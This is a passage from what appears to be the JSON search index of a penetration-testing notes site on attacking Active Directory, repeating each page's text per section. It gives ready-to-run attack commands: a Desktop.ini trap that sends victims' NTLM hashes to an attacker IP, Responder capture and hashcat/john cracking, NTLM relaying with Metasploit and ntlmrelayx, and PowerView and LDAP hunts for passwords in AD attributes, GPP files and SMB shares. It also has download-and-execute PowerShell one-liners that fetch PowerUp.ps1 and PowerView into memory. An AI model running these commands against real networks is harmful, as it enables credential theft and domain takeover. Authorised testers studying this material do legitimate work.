parameter value. For example, update the \"scriptPath\" parameter value on a target user object to cause that user to run your specified executable/commands the next time that user logs on. Abused with Set-DomainObject . WriteOwner: The ability to update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. Abused with Set-DomainObjectOwner. WriteDACL: The ability to write a new ACE to the target object\u2019s DACL. For example, an attacker may write a new ACE to the target object DACL giving the attacker \"full control\" of the target object. Abused with Add-NewADObjectAccessControlEntry . AllExtendedRights: The ability to perform any action associated with extended Active Directory rights against the object. For example, adding principals to a group and force changing a target user\u2019s password are both examples of extended rights. Abused with Set-DomainUserPassword or Add-DomainGroupMember .","title":"How to exploit"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_access_control_lists/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_access_control_lists/#references","text":"","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_read_only_domain_controller/","text":"Background # Read-only Domain Controllers are sometimes configured to allow password caching. They are sometimes also managed by non-admin users, that might be easy to compromise. If you manage to compromise the RODC administrator you can dump the cached credentials from the RODC. How to check for # How to exploit # Recommendation # References # https://adsecurity.org/?p=3592","title":"Misconfigured RODC"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_read_only_domain_controller/#background","text":"Read-only Domain Controllers are sometimes configured to allow password caching. They are sometimes also managed by non-admin users, that might be easy to compromise. If you manage to compromise the RODC administrator you can dump the cached credentials from the RODC.","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_read_only_domain_controller/#how-to-check-for","text":"","title":"How to check for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_read_only_domain_controller/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_read_only_domain_controller/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_read_only_domain_controller/#references","text":"https://adsecurity.org/?p=3592","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/ntlm_relaying_and_theft/","text":"TLDR # Background # Goal: Steal NTLM-hash or a challenge-response handshake. Goal: Perform a relay attack to authenticate against a server. There are many ways to trick computers into sending the authenticated user's NTLM hashes. Desktop.ini files # Find a commonly used share where your user has write permissions. See SMB Shares Mining for how to find writable shares. The folder cannot be the root-folder of the share. So if you have write-access to the root of the share you can just create a folder there. Name the folder 0Dcouments or something like that. If the folder that is writable contains many folders the folder lower down won't be \"rendered\" until the user scrolls down. So naming you folder somthing with a 0 garantes that it will be rendered early. Create desktop.ini file on an SMB-share used by other users. Viewing the share in explorer will cause a request for a resource, allowing the capture or relay of NTLM-challenge responses. Filename: Desktop.ini [.ShellClassInfo] IconFile=\\\\10.13.37.100\\test\\test.ico IconIndex=0 The folder in which the Desktop.ini file in needs to be configured with the system flag. attrib +s <path-to-folder> We need to now also set desktop.ini to be hidden and system before windows will respect it. attrib +s +h desktop.ini Placing this on a commonly visited network share, will trick the victim's computer into authenticating towards the specified IP. This can be used in NTLM-relaying attacks, or to steal the challenge-response and run hashcat on it Capture Challenge Response and Crack the Hash # When the victim enters the share the victim machine will try to authenticate to your attacker-machine, and using responder we can retreive the NTLM hash of the victim. IMPORTANT DO NOT RUN RESPONDER WITHOUT the -A flag unless you know what you are doing It will poison and other suff. -A will make it passive, analyzing mode. responder -v -A -I eth0 Now once responder has recorded the challenge/response it is stored in a logfile found here (on kali): /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.66.10.txt If you don't want to use responder you can use tcpdump, and the use pcredz . It will find the authentications that are used. Not sure how well it works with challenge-response though. Cracking the Hash # With John: john SMB-NTLMv2-SSP-192.168.66.10.txt --wordlist=/usr/share/wordlists/rockyou.txt With Hashcat: hashcat -m 5600 -a 3 --force /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.66.10.txt /usr/share/wordlists/rockyou.txt Relaying # Metasploit use windows/smb/smb_relay # SMBHOST 192.168.66.88 no The target SMB server (leave empty for originating system) set SMBHOST <ANY host that you think the user has Admin access to> # Set the payload you want The authentication actually worked but I got no shell when I tested it. Not sure why. Impacket The same thing can be done with impacket. If no command is entered the default behaviour is to dump all the users hashes if the authenticated user is an administrator of course. sudo ./ntlmrelayx.py -t 192.168.66.88 -c whoami Recommendation #","title":"NTLM Relaying and Theft"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/ntlm_relaying_and_theft/#tldr","text":"","title":"TLDR"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/ntlm_relaying_and_theft/#background","text":"Goal: Steal NTLM-hash or a challenge-response handshake. Goal: Perform a relay attack to authenticate against a server. There are many ways to trick computers into sending the authenticated user's NTLM hashes.","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/ntlm_relaying_and_theft/#desktopini-files","text":"Find a commonly used share where your user has write permissions. See SMB Shares Mining for how to find writable shares. The folder cannot be the root-folder of the share. So if you have write-access to the root of the share you can just create a folder there. Name the folder 0Dcouments or something like that. If the folder that is writable contains many folders the folder lower down won't be \"rendered\" until the user scrolls down. So naming you folder somthing with a 0 garantes that it will be rendered early. Create desktop.ini file on an SMB-share used by other users. Viewing the share in explorer will cause a request for a resource, allowing the capture or relay of NTLM-challenge responses. Filename: Desktop.ini [.ShellClassInfo] IconFile=\\\\10.13.37.100\\test\\test.ico IconIndex=0 The folder in which the Desktop.ini file in needs to be configured with the system flag. attrib +s <path-to-folder> We need to now also set desktop.ini to be hidden and system before windows will respect it. attrib +s +h desktop.ini Placing this on a commonly visited network share, will trick the victim's computer into authenticating towards the specified IP. This can be used in NTLM-relaying attacks, or to steal the challenge-response and run hashcat on it","title":"Desktop.ini files"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/ntlm_relaying_and_theft/#capture-challenge-response-and-crack-the-hash","text":"When the victim enters the share the victim machine will try to authenticate to your attacker-machine, and using responder we can retreive the NTLM hash of the victim. IMPORTANT DO NOT RUN RESPONDER WITHOUT the -A flag unless you know what you are doing It will poison and other suff. -A will make it passive, analyzing mode. responder -v -A -I eth0 Now once responder has recorded the challenge/response it is stored in a logfile found here (on kali): /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.66.10.txt If you don't want to use responder you can use tcpdump, and the use pcredz . It will find the authentications that are used. Not sure how well it works with challenge-response though.","title":"Capture Challenge Response and Crack the Hash"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/ntlm_relaying_and_theft/#cracking-the-hash","text":"With John: john SMB-NTLMv2-SSP-192.168.66.10.txt --wordlist=/usr/share/wordlists/rockyou.txt With Hashcat: hashcat -m 5600 -a 3 --force /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.66.10.txt /usr/share/wordlists/rockyou.txt","title":"Cracking the Hash"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/ntlm_relaying_and_theft/#relaying","text":"Metasploit use windows/smb/smb_relay # SMBHOST 192.168.66.88 no The target SMB server (leave empty for originating system) set SMBHOST <ANY host that you think the user has Admin access to> # Set the payload you want The authentication actually worked but I got no shell when I tested it. Not sure why. Impacket The same thing can be done with impacket. If no command is entered the default behaviour is to dump all the users hashes if the authenticated user is an administrator of course. sudo ./ntlmrelayx.py -t 192.168.66.88 -c whoami","title":"Relaying"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/ntlm_relaying_and_theft/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_active_directory_attributes/","text":"Password in Active Directory attributes # Inb order to search through users or objects you need to Interesting attributes to search for, remember these can be for either computer or a user. comment description UserPassword UnixUserPassword unicodePwd msSFU30Password Other interesting might be adminDescription dBCSPwd lmpwdHistory nTPwdHistory supplementalCredentials Using PowerView # Get-DomainUser -Domain evilcorp.local -Properties samaccountname,comment,description,userpassword,unixuserpassword,unicodepwd,mssfu30password,admindescription,dbcspwd,lmpwdhistory,ntpwdhistory,supplementalcredentials -LDAPFilter '(|(comment=*)(description=*)(userpassword=*)(unixuserpassword=*)(unicodepwd=*)(mssfu30password=*)(admindescription=*)(dbcspwd=*)(lmpwdhistory=*)(ntpwdhistory=*)(supplementalcredentials=*))' | fl > C:\\attributes.txt Using ldap query # ldapsearch -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(|(userPassword=*)(UnixUserPassword=*)(unicodePwd=*)(msSFU30Password=*)(adminDescription=*)(lmpwdHistory=*)(nTPwdHistory=*)(supplementalCredentials=*))\" userPassword unixUserPassword unicodePwd msSFU30Password adminDescription lmpwdHistory nTPwdHistory supplementalCredentials These will generate a lot of results, and you will have to go through the result one by way, or just grep for relevant words. If the LDAP server has a maxsize of results to display, it will cap the response at that size. To get around that, and to not make mega-queries, your can set a size-limit, and then be promped to receive more. If the response contains \u00e5\u00e4\u00f6 the result is base64-encoded. ldapsearch -E pr=500/prompt -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(|(description=*)(comment=*)(info=*))\" description comment info | tee results.txt grep -i 'pwd\\|passw\\|l\u00f6sen\\|losen\\|somma\\|vinter\\|' Or you can perform the search in the LDAP query itself: ldapsearch -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(|(description=*passw*)(description=*l\u00f6sen*)(description=*losen*)(comment=*passw*)(comment=*l\u00f6sen*)(comment=*losen*))\" Debugging problems # If you receive this error it means that you are not allowed to authenticate to the LDAP server from your HOST. additional info: 80090308: LdapErr: DSID-0C09042A, comment: AcceptSecurityContext error, data 531, v3839 On your AD users there exists an attribute called userWorkstations , this attribute specified from which workstations you are allowed to authenticate to the LDAP server. Since your linux-machines hostname is not among those specified in the userWorkstations attribute you are not allowed. A possible workaround, that I have not tested but might work, is to change the hostname to a hostname that is specified in userWorkstations attribute of the user. This presents a catch22, because you need LDAP access to know which userWorksations are allowed. Using Bloodhound and bash # echo \"match (a) return a.description;\" | /usr/share/neo4j/bin/cypher-shell -u neo4j -p <creds> --format plain | sort -u Using ActiveDirectory module # # This will only search for a specific OU Get-ADUser -Filter * -SearchBase \"OU=Users OU,DC=hackdomain,DC=local\" -Properties comment # This will search for the whole domain Get-ADUser -Filter * -SearchBase \"DC=hackdomain,DC=local\" -Properties comment","title":"Passwords in Active Directory Attributes"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_active_directory_attributes/#password-in-active-directory-attributes","text":"Inb order to search through users or objects you need to Interesting attributes to search for, remember these can be for either computer or a user. comment description UserPassword UnixUserPassword unicodePwd msSFU30Password Other interesting might be adminDescription dBCSPwd lmpwdHistory nTPwdHistory supplementalCredentials","title":"Password in Active Directory attributes"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_active_directory_attributes/#using-powerview","text":"Get-DomainUser -Domain evilcorp.local -Properties samaccountname,comment,description,userpassword,unixuserpassword,unicodepwd,mssfu30password,admindescription,dbcspwd,lmpwdhistory,ntpwdhistory,supplementalcredentials -LDAPFilter '(|(comment=*)(description=*)(userpassword=*)(unixuserpassword=*)(unicodepwd=*)(mssfu30password=*)(admindescription=*)(dbcspwd=*)(lmpwdhistory=*)(ntpwdhistory=*)(supplementalcredentials=*))' | fl > C:\\attributes.txt","title":"Using PowerView"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_active_directory_attributes/#using-ldap-query","text":"ldapsearch -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(|(userPassword=*)(UnixUserPassword=*)(unicodePwd=*)(msSFU30Password=*)(adminDescription=*)(lmpwdHistory=*)(nTPwdHistory=*)(supplementalCredentials=*))\" userPassword unixUserPassword unicodePwd msSFU30Password adminDescription lmpwdHistory nTPwdHistory supplementalCredentials These will generate a lot of results, and you will have to go through the result one by way, or just grep for relevant words. If the LDAP server has a maxsize of results to display, it will cap the response at that size. To get around that, and to not make mega-queries, your can set a size-limit, and then be promped to receive more. If the response contains \u00e5\u00e4\u00f6 the result is base64-encoded. ldapsearch -E pr=500/prompt -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(|(description=*)(comment=*)(info=*))\" description comment info | tee results.txt grep -i 'pwd\\|passw\\|l\u00f6sen\\|losen\\|somma\\|vinter\\|' Or you can perform the search in the LDAP query itself: ldapsearch -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(|(description=*passw*)(description=*l\u00f6sen*)(description=*losen*)(comment=*passw*)(comment=*l\u00f6sen*)(comment=*losen*))\"","title":"Using ldap query"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_active_directory_attributes/#debugging-problems","text":"If you receive this error it means that you are not allowed to authenticate to the LDAP server from your HOST. additional info: 80090308: LdapErr: DSID-0C09042A, comment: AcceptSecurityContext error, data 531, v3839 On your AD users there exists an attribute called userWorkstations , this attribute specified from which workstations you are allowed to authenticate to the LDAP server. Since your linux-machines hostname is not among those specified in the userWorkstations attribute you are not allowed. A possible workaround, that I have not tested but might work, is to change the hostname to a hostname that is specified in userWorkstations attribute of the user. This presents a catch22, because you need LDAP access to know which userWorksations are allowed.","title":"Debugging problems"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_active_directory_attributes/#using-bloodhound-and-bash","text":"echo \"match (a) return a.description;\" | /usr/share/neo4j/bin/cypher-shell -u neo4j -p <creds> --format plain | sort -u","title":"Using Bloodhound and bash"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_active_directory_attributes/#using-activedirectory-module","text":"# This will only search for a specific OU Get-ADUser -Filter * -SearchBase \"OU=Users OU,DC=hackdomain,DC=local\" -Properties comment # This will search for the whole domain Get-ADUser -Filter * -SearchBase \"DC=hackdomain,DC=local\" -Properties comment","title":"Using ActiveDirectory module"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_group_policy_preferences/","text":"Background # How to check for # Note that if the domain have trust with another domain it is likely that your user will access the SYSVOL of that domain as well. So make sure to check both (or however many domains there are trust too) domains SYSVOL. To check which other domains there are trust to nltest /domain_trusts Using CMD findstr # findstr /S /I cpassword \\\\<FQDN>\\sysvol\\<FQDN>\\policies\\*.xml Using PowerUp.ps1 # powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1'); Get-CachedGPPPassword\" Semi-manually # Mount the SYSVOL of a Domain Controller net use K: \\\\dc01\\sysvol K: cd <domain>\\Policies gci -recurse -filter \"*.xml\" | select-string cpass | out-file C:\\Users\\<YOUUSER>\\Documents\\gppresults.txt If you found a string you can decrypt it with: gpp-decyypt <string> References # For more info: https://adsecurity.org/?p=2288","title":"Password in GPO"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_group_policy_preferences/#background","text":"","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_group_policy_preferences/#how-to-check-for","text":"Note that if the domain have trust with another domain it is likely that your user will access the SYSVOL of that domain as well. So make sure to check both (or however many domains there are trust too) domains SYSVOL. To check which other domains there are trust to nltest /domain_trusts","title":"How to check for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_group_policy_preferences/#using-cmd-findstr","text":"findstr /S /I cpassword \\\\<FQDN>\\sysvol\\<FQDN>\\policies\\*.xml","title":"Using CMD findstr"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_group_policy_preferences/#using-powerupps1","text":"powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1'); Get-CachedGPPPassword\"","title":"Using PowerUp.ps1"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_group_policy_preferences/#semi-manually","text":"Mount the SYSVOL of a Domain Controller net use K: \\\\dc01\\sysvol K: cd <domain>\\Policies gci -recurse -filter \"*.xml\" | select-string cpass | out-file C:\\Users\\<YOUUSER>\\Documents\\gppresults.txt If you found a string you can decrypt it with: gpp-decyypt <string>","title":"Semi-manually"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_group_policy_preferences/#references","text":"For more info: https://adsecurity.org/?p=2288","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/smb_shares_mining/","text":"Background # Windows shares are exposed on port 445, and access with the SMB protocol. Enumerateusing smbmap # A good tool to map available shares from linux is the following way. You can enumerate just one host if you like. Otherwise you can use nmap to scan the network for open smb ports, save those IP:s in a list. And then scane the entire list with smbmap. Remember that this will check write permission. smbmap checks write-permissions by creating a folder, and the deleting it. Sometimes it is possible to create a folder, but not remove it, then it will leave a folder with some random name. smbmap tells you when this happens, so you need to ask someone with correct privileges to remove it. Find shares that are accessible for anonymous users: smbmap --host-file hosts.txt > smbmapresults.txt smbmap -u domainusername -p 'supersecretpassword' -d domain.local --host-file /home/<user>/Documents/smbmap/hosts.txt > result.txt smbmap -u domainusername -p 'supersecretpassword' -d domain.local --host-file /home/<user>/mappashares/testdownload/test2.txt -R -A '.\\.bat\\b' Enumerate with PowerView # See chapter tools to see how to install PowerSploit. First we can list all the shares on the domain: # Finding all shares that exists on the domain. Not very useful. find-domainshare # Enumerate all shares that the current user has access to find-domainshare -CheckShareAccess | export-csv domainshares.csv # If you get another users account you can test what smb-access that users has. You run the command, and a popup lets you insert the password and then enumerate from that perspective find-domainshare -Credential hackdomain\\user However, it might be faster to search for specific files. find-interestingDomainShareFile -Include ('*.pfx','*.cer','*.pvk','*.pem','*.key','*.crt','*.skr','*.txt','*.rtf','*.cnf','*.cf','*.conf','*.cfg','*.config','*.yml','*.xml','*.json','*.pp','*.vbs','*.bat','*.cmd','*.wsf','*.ps1','*.sql','*.py','*.rb','*.pl','*.sh','*.vmdk','*.vhd','*.vhdx','*.bak','*.mdf','*.sdf','*.dump','*.zip','*.tar','*.gz','*.7z','*cred','*pass','*login','*konto','*l\u00f6sen','*anv\u00e4ndar','*inlogg','*user','*nyckel','*hemlig','*backup','*dump','*config','*setting') Access the files # From a windows machine on the same network with domain credentials you can use the following to map a network drive. # First just run `net use` to list all the currently mapped network shares net use # Then map a share to a specific name, in the case `x`, but it can be anything. net use x: \\\\192.168.xx.x\\nameofshare # Now access the share by running this command x: # In order to disconnect from the network share you run this command. Delete here refers to deleting the network connection, not the drive, of course. net use x: /delete Search the files # get-childitem -recurse | select-string -pattern \"password\" -list | Out-file test.txt","title":"SMB Shares Mining"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/smb_shares_mining/#background","text":"Windows shares are exposed on port 445, and access with the SMB protocol.","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/smb_shares_mining/#enumerateusing-smbmap","text":"A good tool to map available shares from linux is the following way. You can enumerate just one host if you like. Otherwise you can use nmap to scan the network for open smb ports, save those IP:s in a list. And then scane the entire list with smbmap. Remember that this will check write permission. smbmap checks write-permissions by creating a folder, and the deleting it. Sometimes it is possible to create a folder, but not remove it, then it will leave a folder with some random name. smbmap tells you when this happens, so you need to ask someone with correct privileges to remove it. Find shares that are accessible for anonymous users: smbmap --host-file hosts.txt > smbmapresults.txt smbmap -u domainusername -p 'supersecretpassword' -d domain.local --host-file /home/<user>/Documents/smbmap/hosts.txt > result.txt smbmap -u domainusername -p 'supersecretpassword' -d domain.local --host-file /home/<user>/mappashares/testdownload/test2.txt -R -A '.\\.bat\\b'","title":"Enumerateusing smbmap"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/smb_shares_mining/#enumerate-with-powerview","text":"See chapter tools to see how to install PowerSploit. First we can list all the shares on the domain: # Finding all shares that exists on the domain. Not very useful. find-domainshare # Enumerate all shares that the current user has access to find-domainshare -CheckShareAccess | export-csv domainshares.csv # If you get another users account you can test what smb-access that users has. You run the command, and a popup lets you insert the password and then enumerate from that perspective find-domainshare -Credential hackdomain\\user However, it might be faster to search for specific files. find-interestingDomainShareFile -Include ('*.pfx','*.cer','*.pvk','*.pem','*.key','*.crt','*.skr','*.txt','*.rtf','*.cnf','*.cf','*.conf','*.cfg','*.config','*.yml','*.xml','*.json','*.pp','*.vbs','*.bat','*.cmd','*.wsf','*.ps1','*.sql','*.py','*.rb','*.pl','*.sh','*.vmdk','*.vhd','*.vhdx','*.bak','*.mdf','*.sdf','*.dump','*.zip','*.tar','*.gz','*.7z','*cred','*pass','*login','*konto','*l\u00f6sen','*anv\u00e4ndar','*inlogg','*user','*nyckel','*hemlig','*backup','*dump','*config','*setting')","title":"Enumerate with PowerView"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/smb_shares_mining/#access-the-files","text":"From a windows machine on the same network with domain credentials you can use the following to map a network drive. # First just run `net use` to list all the currently mapped network shares net use # Then map a share to a specific name, in the case `x`, but it can be anything. net use x: \\\\192.168.xx.x\\nameofshare # Now access the share by running this command x: # In order to disconnect from the network share you run this command. Delete here refers to deleting the network connection, not the drive, of course. net use x: /delete","title":"Access the files"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/smb_shares_mining/#search-the-files","text":"get-childitem -recurse | select-string -pattern \"password\" -list | Out-file test.txt","title":"Search the files"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/template/","text":"Background # Pre-requisites # Risks # How to check for # How to exploit # Recommendation # Related Vulnerabilities # This finding should not be reported as the name of this issue, instead it should be reported as the vulnerabilities written below. The below written vulnerabilities map to the vulnerability-descriptions in that repo. For example, if kerberoast, report as the following vulnerabilities if they are applicable: Weak password [ID of issue] Overpriviliged kerberoastable user [ID of issue] References #","title":"Template"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/template/#background","text":"","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/template/#pre-requisites","text":"","title":"Pre-requisites"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/template/#risks","text":"","title":"Risks"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/template/#how-to-check-for","text":"","title":"How to check for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/template/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/template/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/template/#related-vulnerabilities","text":"This finding should not be reported as the name of this issue, instead it should be reported as the vulnerabilities written below. The below written vulnerabilities map to the vulnerability-descriptions in that repo. For example, if kerberoast, report as the following vulnerabilities if they are applicable: Weak password [ID of issue] Overpriviliged kerberoastable user [ID of issue]","title":"Related Vulnerabilities"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/template/#references","text":"","title":"References"},{"location":"attacking_active_directory_domain/cracking_hashes/cracking_hashes/","text":"Domain Logon Information (DCC2) # Format $DCC2$#user#7eb833ab3baaade155de2bc642debdaa ./hashcat-5.0.0/hashcat64.bin -a 0 -m 2100 -o result.txt -r ./hashcat-5.0.0/rules/dive.rule ./hashes.txt /usr/share/wordlists/rockyou.txt Kerberoast # Format: ./hashcat-5.0.0/hashcat64.bin -O -w 3 -a 0 -m 13100 -o result.txt -r ./hashcat-5.0.0/rules/dive.rule ./hashes.txt /usr/share/wordlists/rockyou.txt NTLM # Format: edb2b435b51404dadad3a445c11404aa ./hashcat-5.0.0/hashcat64.bin -a 0 -m 1000 -o result.txt -r ./hashcat-5.0.0/rules/dive.rule ./hashes.txt /usr/share/wordlists/rockyou.txt","title":"Cracking Hashes"},{"location":"attacking_active_directory_domain/cracking_hashes/cracking_hashes/#domain-logon-information-dcc2","text":"Format $DCC2$#user#7eb833ab3baaade155de2bc642debdaa ./hashcat-5.0.0/hashcat64.bin -a 0 -m 2100 -o result.txt -r ./hashcat-5.0.0/rules/dive.rule ./hashes.txt /usr/share/wordlists/rockyou.txt","title":"Domain Logon Information (DCC2)"},{"location":"attacking_active_directory_domain/cracking_hashes/cracking_hashes/#kerberoast","text":"Format: ./hashcat-5.0.0/hashcat64.bin -O -w 3 -a 0 -m 13100 -o result.txt -r ./hashcat-5.0.0/rules/dive.rule ./hashes.txt /usr/share/wordlists/rockyou.txt","title":"Kerberoast"},{"location":"attacking_active_directory_domain/cracking_hashes/cracking_hashes/#ntlm","text":"Format: edb2b435b51404dadad3a445c11404aa ./hashcat-5.0.0/hashcat64.bin -a 0 -m 1000 -o result.txt -r ./hashcat-5.0.0/rules/dive.rule ./hashes.txt /usr/share/wordlists/rockyou.txt","title":"NTLM"},{"location":"attacking_active_directory_domain/cracking_hashes/generate_password_list/","text":"No matter if you do an internal, external, AD or even web application test you might need to generate password lists in order to try some brute forcing. Create wordlist from website # This can be done with wordlist-extractor in burp. Create wordlist from Active Directory # This oneliner will get the Firstname (givenName), Lastname (sn) and Firstname and Lastname combinend (name) of a user, and the name of all the computers. Remove whitespace, and turn them all into lowercase and remove duplicates. Of course you will need to change the -h flag to the correct domain-controller ip/hostname, change -b flag to the correct domain name, and -D to the Distinguished name of your user, and the -w to your users password. ldapsearch -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(|(objectClass=Computer)(objectClass=User))\" givenName sn name | grep 'givenName\\|sn\\|name' | cut -d \":\" -f 2 | tr -d ' ' | tr '[:upper:]' '[:lower:]' | sort -u","title":"Generate Password List"},{"location":"attacking_active_directory_domain/cracking_hashes/generate_password_list/#create-wordlist-from-website","text":"This can be done with wordlist-extractor in burp.","title":"Create wordlist from website"},{"location":"attacking_active_directory_domain/cracking_hashes/generate_password_list/#create-wordlist-from-active-directory","text":"This oneliner will get the Firstname (givenName), Lastname (sn) and Firstname and Lastname combinend (name) of a user, and the name of all the computers. Remove whitespace, and turn them all into lowercase and remove duplicates. Of course you will need to change the -h flag to the correct domain-controller ip/hostname, change -b flag to the correct domain name, and -D to the Distinguished name of your user, and the -w to your users password. ldapsearch -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(|(objectClass=Computer)(objectClass=User))\" givenName sn name | grep 'givenName\\|sn\\|name' | cut -d \":\" -f 2 | tr -d ' ' | tr '[:upper:]' '[:lower:]' | sort -u","title":"Create wordlist from Active Directory"},{"location":"attacking_active_directory_domain/good_to_know/active_directory_help_commands/","text":"Installing Remote Server Administation Tools # You can download it from powershell like this: Enable-WindowsOptionalFeature -Online -FeatureName RSATClient-Roles-AD-Powershell import-module activedirectory If that doesnt work, you need to download it, just google Rmote Server ADministation tool WIndows 10, 8 or whatever. Download it. Install it. Restart the the computer. Open up Control Panel / Turn Windows Features on and Off / Rmote Server ADministation Tools / Role Administation TOols / AD DS and AD LDS tools / Active directory module for windows powershell Runas / Testing a user account # Say to get access to creds from a user. Or just want to run a program in the context of another user. Kind of like SUDO put over the network, you can do: runas /user:USERNAME@domain.local cmd.exe or runsas /user:domain.local\\USERNAME Export to CSV # You can always pipe the return data to a CSV file, like this: find-domainshare -CheckShareAccess | Export-Csv qwe.csv Download module an inject into memory # If you are using PowerView, remember to use the Dev-version, since it is correct with the documentation. IEX (New-Object Net.WebClient).DownloadString('http://192.168.66.123/PowerView.ps1');","title":"Helpful Commands and Scripts"},{"location":"attacking_active_directory_domain/good_to_know/active_directory_help_commands/#installing-remote-server-administation-tools","text":"You can download it from powershell like this: Enable-WindowsOptionalFeature -Online -FeatureName RSATClient-Roles-AD-Powershell import-module activedirectory If that doesnt work, you need to download it, just google Rmote Server ADministation tool WIndows 10, 8 or whatever. Download it. Install it. Restart the the computer. Open up Control Panel / Turn Windows Features on and Off / Rmote Server ADministation Tools / Role Administation TOols / AD DS and AD LDS tools / Active directory module for windows powershell","title":"Installing Remote Server Administation Tools"},{"location":"attacking_active_directory_domain/good_to_know/active_directory_help_commands/#runas-testing-a-user-account","text":"Say to get access to creds from a user. Or just want to run a program in the context of another user. Kind of like SUDO put over the network, you can do: runas /user:USERNAME@domain.local cmd.exe or runsas /user:domain.local\\USERNAME","title":"Runas / Testing a user account"},{"location":"attacking_active_directory_domain/good_to_know/active_directory_help_commands/#export-to-csv","text":"You can always pipe the return data to a CSV file, like this: find-domainshare -CheckShareAccess | Export-Csv qwe.csv","title":"Export to CSV"},{"location":"attacking_active_directory_domain/good_to_know/active_directory_help_commands/#download-module-an-inject-into-memory","text":"If you are using PowerView, remember to use the Dev-version, since it is correct with the documentation. IEX (New-Object Net.WebClient).DownloadString('http://192.168.66.123/PowerView.ps1');","title":"Download module an inject into memory"},{"location":"attacking_active_directory_domain/good_to_know/ldap_syntax/","text":"The best way to follow along this article is by downloading ADExplorer.exe from sysinternals and authenticate to your Active Directory. Directory Servers # A directory server (more technically referred to as a Directory Server Agent, a Directory System Agent, or a DSA) is a type of network database that stores information represented as trees of entries. This is different from a relational database, which uses tables comprised of rows and columns, so directory servers may be considered a type of NoSQL database (even though directory servers have been around a lot longer than the term NoSQL has). While virtually all directory servers support LDAP, some servers offer support for additional protocols that can be used to interact with the data. Some of these protocols include X.500 (the original Directory Access Protocol, for which LDAP is a much more lightweight version), naming service protocols like DNS and NIS, HTTP-based protocols like DSML and SCIM, and proprietary protocols like Novell\u2019s NDS. The Directory Server interesting to us is of course Microsoft Active 